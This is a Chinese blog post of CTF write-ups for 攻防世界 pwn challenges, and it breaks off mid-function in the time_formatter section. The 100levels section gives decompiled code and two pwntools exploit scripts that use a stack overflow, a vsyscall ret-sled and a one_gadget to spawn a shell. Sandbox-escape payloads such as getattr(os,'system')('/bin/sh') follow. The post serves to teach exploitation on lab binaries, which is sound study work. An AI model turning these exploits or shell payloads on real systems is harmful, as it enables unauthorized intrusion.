<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    
    
    <title>攻防世界-pwn prac | Room of Requirement | pwn what you want</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="keywords" content="pwn,heap,stack">
    <link rel="shortcut icon" href="/img/favicon.ico">
    <link rel="stylesheet" href="/css/third-party/swipebox.min.css?v=1.3.2">
    <link rel="stylesheet" href="/css/style.css?v=1.3.2">
    
    <script type="text/javascript">
        // Data Center
        var DC = {
            reward:	true,
            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
            g: JSON.parse('{"enable":false,"lazy":true,"owner":"siriuswhiter","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
            d: JSON.parse('{"app_id":null}')
        };
    </script>
    <script type="text/javascript">
        window.lazyScripts=[];
    </script>
    
</head>


<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap">
      
      <img src="/img/brand.jpg" class="brand-bg">
      
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">Sirius Whiter</h5>
          <a href="mailto:xuewenjie2017@outlook.com" title="xuewenjie2017@outlook.com" class="mail">
            
              <span>x</span>
            
              <span>u</span>
            
              <span>e</span>
            
              <span>w</span>
            
              <span>e</span>
            
              <span>n</span>
            
              <span>j</span>
            
              <span>i</span>
            
              <span>e</span>
            
              <span>2</span>
            
              <span>0</span>
            
              <span>1</span>
            
              <span>7</span>
            
              <span>@</span>
            
              <span>o</span>
            
              <span>u</span>
            
              <span>t</span>
            
              <span>l</span>
            
              <span>o</span>
            
              <span>o</span>
            
              <span>k</span>
            
              <span>.</span>
            
              <span>c</span>
            
              <span>o</span>
            
              <span>m</span>
            
          </a>
        </hgroup>
        
        <ul class="menu-link">
          
              <li>
                <a href="https://github.com/siriuswhiter" target="_blank">
                  <i class="icon icon-lg icon-github"></i>
                </a>
              </li>
            
        </ul>
        
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                HOME
              </a>
            </li>
        
            <li class="">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                CATEGORIES
              </a>
            </li>
        
            <li class="">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                TAGS
              </a>
            </li>
        
            <li class="">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                ARCHIVES
              </a>
            </li>
        
            <li class="">
              <a href="/about"  >
                <i class="icon icon-lg icon-user"></i>
                ABOUT
              </a>
            </li>
        
            <li class="">
              <a href="https://github.com/siriuswhiter" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        
	
<header class="top-header" id="header">
    <div class="flex-row clearfix">
        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">
            <span>攻防世界-pwn prac</span>
            
        </div>
        
        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
            <i class="icon icon-lg icon-search"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">
    <img src="/img/banner.jpg" class="header-bg">
    <div class="container fade-scale">
        <h1 class="title">攻防世界-pwn prac</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-04-06T06:32:55.000Z" itemprop="datePublished" class="page-time">
  2019-04-06
</time>


	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/stack/">stack</a></li></ul>

            
        </h5>
        
    </div>
    

</header>

<div id="site_search">
    <div class="search-title clearfix">
        <span class="pull-left">
          <i class="icon icon-lg icon-search"></i>
        </span>
        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
          <i class="icon icon-lg icon-close"></i>
        </a>
    </div>
    <div id="local-search-result"></div>
</div>




<div class="container body-wrap">
    <article id="post-攻防世界-pwn-prac"
  class="post-article article-type-post" itemprop="blogPost">
    <div class="post-card">
        <h1 class="post-card-title">攻防世界-pwn prac</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-04-06 14:32:55" datetime="2019-04-06T06:32:55.000Z"  itemprop="datePublished">2019-04-06</time>

            
	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/stack/">stack</a></li></ul>



            

            


            
        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            
            <h1 id="100levels"><a href="#100levels" class="headerlink" title="100levels"></a>100levels</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>检查<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure></p>
<p>两个功能： go hint</p>
<p>go:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall go(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ST0C_4</span><br><span class="line">  __int64 v4; // [rsp+0h] [rbp-120h]</span><br><span class="line">  __int64 num2; // [rsp+0h] [rbp-120h]</span><br><span class="line">  int v6; // [rsp+8h] [rbp-118h]</span><br><span class="line">  __int64 num1; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 num1a; // [rsp+10h] [rbp-110h]</span><br><span class="line">  signed __int64 cnt; // [rsp+18h] [rbp-108h]</span><br><span class="line">  __int64 v10; // [rsp+20h] [rbp-100h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;How many levels?&quot;);</span><br><span class="line">  v4 = get_num();</span><br><span class="line">  if ( v4 &gt; 0 )</span><br><span class="line">    num1 = v4;</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Coward&quot;);</span><br><span class="line">  puts(&quot;Any more?&quot;);</span><br><span class="line">  num2 = get_num();</span><br><span class="line">  num1a = num1 + num2;</span><br><span class="line">  if ( num1a &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( num1a &lt;= 99 )</span><br><span class="line">    &#123;</span><br><span class="line">      cnt = num1a;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You are being a real man.&quot;);</span><br><span class="line">      cnt = 100LL;</span><br><span class="line">    &#125;</span><br><span class="line">    puts(&quot;Let&apos;s go!&apos;&quot;);</span><br><span class="line">    v6 = time(0LL);</span><br><span class="line">    if ( (unsigned int)check(cnt) != 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = time(0LL);</span><br><span class="line">      sprintf((char *)&amp;v10, &quot;Great job! You finished %d levels in %d seconds\n&quot;, cnt, (unsigned int)(v3 - v6), num2);</span><br><span class="line">      puts((const char *)&amp;v10);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;You failed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Coward Coward Coward Coward Coward&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>go调用的check<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall check(signed int cnt)</span><br><span class="line">&#123;</span><br><span class="line">  int v2; // eax</span><br><span class="line">  __int64 v3; // rax</span><br><span class="line">  __int64 buf; // [rsp+10h] [rbp-30h]</span><br><span class="line">  __int64 v5; // [rsp+18h] [rbp-28h]</span><br><span class="line">  __int64 v6; // [rsp+20h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+28h] [rbp-18h]</span><br><span class="line">  unsigned int v8; // [rsp+34h] [rbp-Ch]</span><br><span class="line">  unsigned int num2; // [rsp+38h] [rbp-8h]</span><br><span class="line">  unsigned int num1; // [rsp+3Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  buf = 0LL;</span><br><span class="line">  v5 = 0LL;</span><br><span class="line">  v6 = 0LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  if ( !cnt )</span><br><span class="line">    return 1LL;</span><br><span class="line">  if ( (unsigned int)check(cnt - 1) == 0 )</span><br><span class="line">    return 0LL;</span><br><span class="line">  num1 = rand() % cnt;</span><br><span class="line">  v2 = rand();</span><br><span class="line">  num2 = v2 % cnt;</span><br><span class="line">  v8 = v2 % cnt * num1;</span><br><span class="line">  puts(&quot;====================================================&quot;);</span><br><span class="line">  printf(&quot;Level %d\n&quot;, (unsigned int)cnt);</span><br><span class="line">  printf(&quot;Question: %d * %d = ? Answer:&quot;, num1, num2);</span><br><span class="line">  read(0, &amp;buf, 0x400uLL);                      // overflow</span><br><span class="line">  v3 = strtol((const char *)&amp;buf, 0LL, 10);</span><br><span class="line">  return v3 == v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>hint<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">int hint()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v1; // [rsp+8h] [rbp-108h]</span><br><span class="line">  int v2; // [rsp+10h] [rbp-100h]</span><br><span class="line">  __int16 v3; // [rsp+14h] [rbp-FCh]</span><br><span class="line"></span><br><span class="line">  if ( flag )</span><br><span class="line">  &#123;</span><br><span class="line">    sprintf((char *)&amp;v1, &quot;Hint: %p\n&quot;, &amp;system, &amp;system);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = &apos;N NWP ON&apos;;</span><br><span class="line">    v2 = &apos;UF O&apos;;</span><br><span class="line">    v3 = &apos;N&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts((const char *)&amp;v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>容易发现的漏洞就是check时的溢出，还有问题就是go初始时输入两次值，最后使用的是两次加起来的值，但是如果第一次输入的值小于等于0就不会初始化第一个值。</p>
<p>最刚开始的想法是通过溢出修改存储在bss段的flag位然后返回到主函数，再使用hint泄露system函数地址<br>但是因为程序开启了pie，因此bss段位置也就是不定的，而如果想要泄露libc，又因为是64位程序，因此需要gadget，但是gadgets的位置也因为pie变得位置不定，所以行不通。</p>
<p>再观察程序，发现：<br>hint函数是先将system函数地址读到了栈上，之后调用fprintf函数输出的，其地址为rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_110         = qword ptr -110h</span><br><span class="line"></span><br><span class="line">mov     rax, cs:system_ptr</span><br><span class="line">mov     [rbp+var_110], rax</span><br></pre></td></tr></table></figure></p>
<p>而如果go读取的第一个数没有初始化的话，他的值就是栈上的值，而它的地址恰巧也是rbp-0x110<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__int64 num1; // [rsp+10h] [rbp-110h]</span><br></pre></td></tr></table></figure></p>
<p>所以我们按理说是可以利用那个对大小判断的函数来逐位爆破system的地址<br>这里需要注意的是如果和大于0进入check，如果顺着令其运行完会直接退出，所以也需要在check中溢出覆盖返回地址以便能够继续爆破</p>
<p>而覆盖的返回地址依旧是不确定的，观察程序运行时的内存映射，发现程序的最后vsyscall段是恒定不变的，我们可以利用它来绕过pie；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10i 0xffffffffff600400</span><br><span class="line">   0xffffffffff600400:	mov    rax,0xc9</span><br><span class="line">   0xffffffffff600407:	syscall </span><br><span class="line">   0xffffffffff600409:	ret    </span><br><span class="line">   0xffffffffff60040a:	int3   </span><br><span class="line">   0xffffffffff60040b:	int3</span><br></pre></td></tr></table></figure></p>
<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>思路一没有复现成功，看到了大佬们的简单一点的思路</p>
<p>前面基本一致，但是不再去爆破system的地址，而是将其覆盖位one_gadget的地址，也就是计算二者偏移的差值然后将其加上去直接得到one_gadget RCE,可以看到这个地址被存放在了栈上，我们的目标就是在后面的栈溢出中想办法使得返回到此处。</p>
<p>执行最后一次时的栈情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">03:0018│ rsi  0x7ffe36cd7780 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│      0x7ffe36cd77a0 ◂— 0x1ae00000000</span><br><span class="line">08:0040│      0x7ffe36cd77a8 ◂— 0x2b0000000a /* &apos;\n&apos; */</span><br><span class="line">09:0048│ rbp  0x7ffe36cd77b0 —▸ 0x7ffe36cd78e0 —▸ 0x7ffe36cd7920 —▸ 0x556f0672efd0 ◂— push   r15</span><br><span class="line">0a:0050│      0x7ffe36cd77b8 —▸ 0x556f0672ec8a ◂— test   eax, eax</span><br><span class="line">0b:0058│      0x7ffe36cd77c0 ◂— 0xfffffffffffffeda</span><br><span class="line">0c:0060│      0x7ffe36cd77c8 ◂— 0x556f5caa9f45       -------》 one_gadget 在这里</span><br></pre></td></tr></table></figure></p>
<p>我们就可以使用vsyscall中的不变量来使返回地址滑向此处执行one_gadget</p>
<ul>
<li>关于 vsyscall</li>
</ul>
<p>简单地说，现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall.</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">system_offset = 0x45390</span><br><span class="line">ret_address = 0xffffffffff600400</span><br><span class="line">target_offset = 0x4526a</span><br><span class="line"></span><br><span class="line">difference = target_offset - system_offset</span><br><span class="line"></span><br><span class="line">def answer(eqn):</span><br><span class="line">    parse = eqn[9:eqn.find(&quot;=&quot;)]</span><br><span class="line">    soln = eval(parse)</span><br><span class="line">    return soln</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    p = process(&quot;./100levels&quot;)</span><br><span class="line">    #p = remote(&quot;47.74.147.103&quot;, 20001)</span><br><span class="line"></span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(&quot;0&quot;)</span><br><span class="line">    p.clean()</span><br><span class="line">    p.sendline(str(difference))</span><br><span class="line"></span><br><span class="line">    for i in range(99):</span><br><span class="line">        p.recvline_contains(&quot;Level&quot;)</span><br><span class="line">        eqn = p.clean()</span><br><span class="line"></span><br><span class="line">        soln = answer(eqn)</span><br><span class="line">        p.send(str(soln)+&quot;\x00&quot;)</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    pay = str(soln) + &quot;\x00&quot;</span><br><span class="line">    pay = pay.ljust(56, &quot;B&quot;)</span><br><span class="line">    pay += p64(ret_address)*3</span><br><span class="line">    log.info(&quot;Injected our vsyscall ROPs&quot;)</span><br><span class="line"></span><br><span class="line">    p.send(pay)</span><br><span class="line">    p.clean()</span><br><span class="line"></span><br><span class="line">    p.success(&quot;Shell spawned! Enjoy!&quot;)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>未成功的思路一</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">sh=process(&apos;./100levels&apos;)</span><br><span class="line">#sh=remote(&apos;111.198.29.45&apos;,&apos;32440&apos;)</span><br><span class="line">elf = ELF(&apos;./100levels&apos;)</span><br><span class="line">libc = ELF(&apos;./libc.so&apos;)</span><br><span class="line"></span><br><span class="line">def go(level,more):</span><br><span class="line">	sh.recvuntil(&apos;Choice:\n&apos;)</span><br><span class="line">	sh.sendline(&apos;1&apos;)</span><br><span class="line">	sh.recvuntil(&apos;levels?\n&apos;)</span><br><span class="line">	sh.sendline(str(level))</span><br><span class="line">	sh.recvuntil(&apos;more?\n&apos;)</span><br><span class="line">	sh.sendline(str(more))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def hint():</span><br><span class="line">	sh.sendlineafter(&apos;Choice:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line">def calc(answer):</span><br><span class="line">	sh.sendlineafter(&apos;Answer:&apos;,answer)</span><br><span class="line"></span><br><span class="line">def leak():</span><br><span class="line">	start = 0x700000000390</span><br><span class="line">	for i in range(10,2,-1):</span><br><span class="line">		for j in range(15,-1,-1):</span><br><span class="line">			hint()</span><br><span class="line">			addr_test = start+(1 &lt;&lt; (i*4)*j)</span><br><span class="line">			go(0,-addr_test)</span><br><span class="line">			a = sh.recvline()</span><br><span class="line"></span><br><span class="line">			if &apos;Coward&apos; not in a:</span><br><span class="line">                		start = addr_test</span><br><span class="line">				log.info(&apos;check &apos;+ hex(addr_test))</span><br><span class="line">                		break</span><br><span class="line">        	pro = log.progress(&apos;go&apos;)</span><br><span class="line">        	for i in range(99):</span><br><span class="line">           	 	pro.status(&apos;level %d&apos;%(i+1))</span><br><span class="line">            		calc(p64(0)*5)</span><br><span class="line">        	#gdb.attach(sh)</span><br><span class="line">		calc(p64(0)*5+p64(0xffffffffff600400)*3)</span><br><span class="line">       		#gdb.attach(sh)</span><br><span class="line">		pro.success(&apos;ok&apos;)</span><br><span class="line">	return start + 0x100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system=leak()</span><br><span class="line">print system</span><br><span class="line"></span><br><span class="line">binsh_addr = system - libc.symbols[&apos;system&apos;]+libc.search(&apos;/bin/sh&apos;).next()</span><br><span class="line">pop_rdi_ret = system - libc.symbols[&apos;system&apos;]+0x21102</span><br><span class="line"></span><br><span class="line">pay = p64(pop_rdi_ret)+p64(binsh_addr)+p64(system)</span><br><span class="line">go(1,0)</span><br><span class="line">pay = &apos;0&apos;*0x38+pay</span><br><span class="line">calc(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>参考：<br><a href="https://bbs.ichunqiu.com/thread-43627-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-43627-1-1.html</a><br><a href="https://nandynarwhals.org/hitbgsec2017-1000levels/" target="_blank" rel="noopener">https://nandynarwhals.org/hitbgsec2017-1000levels/</a><br><a href="https://znqt.github.io/hitb-gsec-pwn-1000levels/" target="_blank" rel="noopener">https://znqt.github.io/hitb-gsec-pwn-1000levels/</a></p>
<h1 id="monkey"><a href="#monkey" class="headerlink" title="monkey"></a>monkey</h1><h2 id="题目-amp-分析-amp-exp"><a href="#题目-amp-分析-amp-exp" class="headerlink" title="题目 &amp; 分析 &amp; exp"></a>题目 &amp; 分析 &amp; exp</h2><p>算是js的沙箱逃逸，给了个The SpiderMonkey shell，可以查询到它的源码之类的东西，<br>可以发现其没有任何过滤，所以给个os.system(“/bin/sh”) 直接拿shell即可</p>
<h1 id="Escape-From-Jail-50"><a href="#Escape-From-Jail-50" class="headerlink" title="Escape_From_Jail-50"></a>Escape_From_Jail-50</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>python沙箱逃逸，只给了个远程连接，检测到被过滤的字符会报错</p>
<p>banned：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.  / &apos; /  import /flag /eval /exec / dir(__builtins__)无反馈 等等</span><br></pre></td></tr></table></figure></p>
<h2 id="分析-amp-exp"><a href="#分析-amp-exp" class="headerlink" title="分析 &amp; exp"></a>分析 &amp; exp</h2><p>许多常见的基本上都被过滤了</p>
<p>不能使用import关键字且不允许使用 “.”，一大部分路就被绝了,</p>
<p>os，未被过滤，但是基本调用需要”.”,所以需要其他方式。</p>
<p>查询资料发现 getattr函数可以使用</p>
<p>相关资料可以看菜鸟：<a href="http://www.runoob.com/python/python-func-getattr.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-getattr.html</a></p>
<p>getattr(os,”system”)(“/bin/sh”)</p>
<h1 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h1><p>比较有意思的一个题目，刚开始没看懂题。。</p>
<h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>重点函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall print(__int64 a1, __int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; // r8</span><br><span class="line">  char command; // [rsp+8h] [rbp-810h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+808h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  if ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, 2048LL, 1LL, 2048LL, &quot;/bin/date -d @%d +&apos;%s&apos;&quot;, (unsigned int)time, ptr, a3);</span><br><span class="line">    __printf_chk(1LL, &quot;Your formatted time is: &quot;);</span><br><span class="line">    fflush(stdout);</span><br><span class="line">    if ( getenv(&quot;DEBUG&quot;) )</span><br><span class="line">      __fprintf_chk(stderr, 1LL, &quot;Running command: %s\n&quot;, &amp;command, v3);</span><br><span class="line">    setenv(&quot;TZ&quot;, value, 1);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You haven&apos;t specified a format!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>退出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __noreturn exit()</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 result; // rax</span><br><span class="line">  char s; // [rsp+8h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v2; // [rsp+18h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">  v2 = 